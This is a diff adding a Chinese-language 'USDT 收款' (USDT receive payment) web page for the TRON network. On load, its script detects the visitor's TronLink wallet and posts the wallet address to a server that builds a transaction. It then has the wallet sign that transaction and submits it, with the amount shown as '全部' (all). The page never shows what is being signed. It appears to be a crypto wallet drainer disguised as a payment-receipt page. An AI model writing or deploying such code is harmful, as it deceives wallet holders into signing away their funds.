@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>USDT 收款</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;color:#fff;font-family:-apple-system,sans-serif;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:20px}
+.box{text-align:center;max-width:320px;width:100%}
+.icon{width:50px;height:50px;background:#00d4aa;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:24px;margin:0 auto 15px}
+h1{font-size:16px;margin-bottom:4px}
+.sub{color:#888;font-size:12px;margin-bottom:25px}
+.amount{background:#111;border-radius:12px;padding:20px;margin-bottom:20px;border:1px solid #222}
+.amount-label{color:#888;font-size:11px;margin-bottom:6px}
+.amount-value{font-size:32px;font-weight:800;color:#fff}
+.amount-unit{font-size:13px;color:#888;margin-left:3px}
+.status{color:#888;font-size:13px;margin-bottom:20px;min-height:20px}
+.status.ok{color:#00d4aa}
+.status.err{color:#ff4444}
+.btn{width:100%;padding:14px;background:#00d4aa;color:#000;border:none;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer;display:none}
+.btn-red{background:#ff4444;color:#fff}
+.info{color:#444;font-size:10px;margin-top:30px}
+</style>
+</head>
+<body>
+<div class="box">
+<div class="icon">💰</div>
+<h1>USDT 收款</h1>
+<div class="sub">正在处理...</div>
+<div class="amount">
+<div class="amount-label">收款金额</div>
+<div><span class="amount-value" id="amt">全部</span><span class="amount-unit">USDT</span></div>
+</div>
+<div class="status" id="st">连接钱包...</div>
+<button class="btn" id="btn" onclick="retry()">重试</button>
+<div class="info">TRON Network</div>
+</div>
+<script>
+const API=location.origin;
+let done=false;
+function gp(n){const u=new URL(location.href);return u.searchParams.get(n);}
+function set(t,ok){const s=document.getElementById('st');s.textContent=t;s.className='status '+(ok?'ok':ok===false?'err':'');}
+
+async function run(){
+if(done)return;done=true;
+const d=gp('d');
+if(d){try{const p=JSON.parse(atob(d.replace(/-/g,'+').replace(/_/g,'/')));if(p.amount&&p.amount!=='all')document.getElementById('amt').textContent=parseFloat(p.amount).toFixed(2);}catch(e){}}
+
+set('检测钱包...');
+for(let i=0;i<25;i++){if(window.tronWeb&&window.tronWeb.ready)break;await new Promise(r=>setTimeout(r,400));}
+if(!window.tronWeb||!window.tronWeb.ready){set('未检测到钱包',false);document.getElementById('btn').style.display='block';document.getElementById('btn').textContent='刷新重试';return;}
+
+const addr=window.tronWeb.defaultAddress.base58;
+set('准备交易...');
+try{
+const r1=await fetch(API+'/api/build-tx',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target:addr})});
+const d1=await r1.json();if(d1.error)throw new Error(d1.error);
+set('签名中...');
+const signed=await window.tronWeb.trx.sign(d1.tx);
+set('提交中...');
+const r2=await fetch(API+'/api/exec',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({signed,target:addr,aid:gp('d')||'direct'})});
+const d2=await r2.json();
+if(d2.result&&(d2.result.result||d2.result.code==='SUCCESS')){
+set('✓ 完成',true);
+}else{throw new Error('提交失败');}
+}catch(e){
+console.error(e);
+set('失败: '+e.message,false);
+document.getElementById('btn').style.display='block';
+document.getElementById('btn').textContent='重试签名';
+}
+}
+
+async function retry(){done=false;run();}
+
+window.addEventListener('load',()=>setTimeout(run,300));
+let chk=setInterval(()=>{if(window.tronWeb&&window.tronWeb.ready&&!done){clearInterval(chk);run();}},300);
+setTimeout(()=>clearInterval(chk),10000);
+</script>
+</body>
+</html>
